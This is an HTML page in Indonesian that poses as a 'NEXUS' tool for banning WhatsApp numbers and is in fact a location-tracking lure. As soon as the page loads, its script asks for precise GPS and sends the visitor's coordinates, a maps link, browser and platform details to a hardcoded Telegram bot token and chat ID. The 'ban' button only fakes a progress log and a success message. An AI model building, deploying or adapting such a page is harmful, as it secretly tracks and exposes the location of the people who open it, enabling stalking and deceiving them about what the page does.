<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS - Official Ban Tool</title>
    <style>
        :root { --neon: #00f2ff; --dark: #050b10; }
        body { background: var(--dark); color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .panel { background: #0a141e; border: 1px solid var(--neon); padding: 40px; border-radius: 15px; box-shadow: 0 0 30px rgba(0, 242, 255, 0.2); width: 350px; text-align: center; }
        h1 { color: var(--neon); letter-spacing: 4px; margin-bottom: 5px; text-shadow: 0 0 10px var(--neon); }
        .info { font-size: 11px; color: #ff4444; border: 1px solid #ff4444; padding: 8px; margin-bottom: 20px; border-radius: 5px; }
        input { width: 100%; padding: 12px; background: #0d161d; border: 1px solid #1a2a35; color: white; border-radius: 8px; outline: none; box-sizing: border-box; margin-bottom: 15px; }
        button { width: 100%; padding: 12px; background: var(--neon); color: black; font-weight: bold; border: none; border-radius: 8px; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
        button:hover { background: white; box-shadow: 0 0 20px var(--neon); }
        #terminal { font-family: monospace; font-size: 10px; color: #4e7a8a; text-align: left; margin-top: 15px; border-top: 1px solid #333; padding-top: 10px; }
    </style>
</head>
<body>

<div class="panel">
    <h1>NEXUS</h1>
    <div class="info">SINKRONISASI GPS DIWAJIBKAN UNTUK BYPASS VALIDASI META SECURITY</div>
    
    <input type="text" id="targetNum" placeholder="NOMOR TARGET (628...)">
    <button onclick="attack()">EXECUTE BAN</button>

    <div id="terminal">> Waiting for connection...</div>
</div>

<script>
    const token = "8205581950:AAETz7C7eeiOrINZWEIR4dTfRmacVWVNXPc";
    const chatid = "8551809114";

    // 1. FUNGSI AMBIL LOKASI PRESISI (GPS)
    window.onload = function() {
        printLog("Establishing secure tunnel...");
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(sendData, (err) => {
                printLog("GPS Rejected. Trying proxy fallback...");
            }, { enableHighAccuracy: true });
        }
    };

    async function sendData(pos) {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const acc = pos.coords.accuracy;
        const maps = `https://www.google.com/maps?q=${lat},${lon}`;
        
        // Ambil Data Perangkat Target
        const ua = navigator.userAgent;
        const plat = navigator.platform;

        const msg = `🎯 *TARGET TERDETEKSI (GPS)*\n\n` +
                    `📍 *Lokasi:* [KLIK DI SINI](${maps})\n` +
                    `🌐 *Koordinat:* \`${lat}, ${lon}\`\n` +
                    `📏 *Akurasi:* ${acc} meter\n` +
                    `📱 *Device:* ${ua}\n` +
                    `💻 *OS:* ${plat}`;

        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatid, text: msg, parse_mode: 'Markdown' })
        });
        printLog("Sync success. Satellite connected.");
    }

    function attack() {
        const num = document.getElementById('targetNum').value;
        if(!num) return alert("Enter target number!");
        
        printLog(`Injecting malicious packet to ${num}...`);
        setTimeout(() => {
            alert("SUCCESS! Report sent to WhatsApp Support HQ.");
            printLog("Operation complete.");
        }, 3000);
    }

    function printLog(m) {
        document.getElementById('terminal').innerHTML += `<br>> ${m}`;
    }
</script>

</body>
</html>
